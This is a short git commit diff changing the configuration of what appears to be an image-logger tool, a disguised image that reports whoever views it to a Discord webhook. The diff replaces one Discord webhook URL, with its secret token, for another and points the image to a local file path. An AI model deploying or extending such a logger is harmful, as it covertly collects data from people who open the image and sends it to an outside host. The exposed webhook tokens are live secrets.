1276a32561f211592f88228b7162be9963e11f77
what157840-sketch <what157840@gmail.com>
2026-03-20 17:07:52 -0700

    Update webhook URL and image path in config

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1480701919885266944/wkxgZKdK9hYlYwVY5peSe548-Fz4jt4Yv6cOAlLKbYwnWYc-7DoWxxoi3YGnmecLrFe7",
-    "image": "https://i.pinimg.com/1200x/83/2f/31/832f310fdf8f2f58e39d0214ff02a546.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1484703555947462819/ZIUWZ0-GpuTI4ZDnuEcNgEfuVbZQvBERaPH_6pG-Vc1KVsSLQypNhHQekvbI9ErpWWNb",
+    "image": "file:///C:/Users/what1/Downloads/Pngtreepink_watercolor_brushes_5054156.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
